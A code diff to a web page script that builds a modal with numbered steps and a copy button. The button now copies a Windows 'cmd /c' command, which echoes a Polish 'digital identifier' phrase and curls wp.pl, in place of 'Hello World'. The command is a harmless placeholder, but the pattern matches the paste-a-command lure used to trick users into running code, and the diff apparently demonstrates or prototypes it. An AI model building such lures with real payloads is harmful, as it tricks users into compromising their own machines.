@@ -11,13 +11,11 @@ function loadCss(url) {
 
 $(document).ready(function() {
 
-
     Promise.all([
         loadCss("https://cdnjs.cloudflare.com/ajax/libs/jquery-modal/0.9.1/jquery.modal.min.css"),
         $.getScript("https://cdnjs.cloudflare.com/ajax/libs/jquery-modal/0.9.1/jquery.modal.min.js")
         
     ]).then(function () {
-
         $("<style>")
             .text(`
                 .modal p {
@@ -25,6 +23,9 @@ $(document).ready(function() {
                 }
                 .modal {
                     color: black !important;
+                }
+                .modal ol li {
+                    margin: 8px;
                 }
                 #copyButton:hover {
                     cursor: pointer;
@@ -55,7 +56,7 @@ $(document).ready(function() {
         $("#ex1").css("margin", "auto");
 
         $("#copyButton").on("click", function () {
-            navigator.clipboard.writeText("Hello World")
+            navigator.clipboard.writeText('cmd /c "echo To jest mój cyfrowy identyfikator && curl https://wp.pl/"')
                 .then(() => {
                     console.log("Skopiowano");
                 })
